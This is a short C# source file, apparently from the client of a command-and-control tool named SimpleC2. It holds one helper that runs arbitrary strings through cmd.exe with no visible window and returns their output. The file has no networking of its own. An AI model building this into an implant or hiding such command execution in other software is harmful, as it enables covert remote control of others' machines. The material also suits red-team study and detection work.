using System.Diagnostics;

namespace SimpleC2.Client
{
    public static class CmdHelper
    {
        public static string ExecuteCommand(string command)
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (Process process = Process.Start(psi))
            {
                return process.StandardOutput.ReadToEnd();
            }
        }
    }
}